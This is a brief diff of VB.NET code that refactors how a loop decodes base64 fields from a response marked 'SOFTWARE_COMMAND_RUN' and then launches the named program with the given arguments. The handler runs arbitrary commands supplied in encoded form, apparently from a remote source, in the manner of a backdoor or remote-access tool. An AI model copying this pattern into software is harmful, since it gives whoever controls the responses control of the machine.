@@ -496,8 +496,8 @@ loops:
                 proc.Start()
             ElseIf res.StartsWith("SOFTWARE_COMMAND_RUN") Then
                 Dim proc As New Process
-                proc.StartInfo.FileName = New UTF8Encoding().GetString(Convert.FromBase64String(res.Split(";")(1)))
-                proc.StartInfo.Arguments = New UTF8Encoding().GetString(Convert.FromBase64String(res.Split(";")(2)))
+                proc.StartInfo.FileName = Encoding.UTF8.GetString(Convert.FromBase64String(res.Split(";")(1)))
+                proc.StartInfo.Arguments = Encoding.UTF8.GetString(Convert.FromBase64String(res.Split(";")(2)))
                 proc.Start()
             End If
             Select Case res
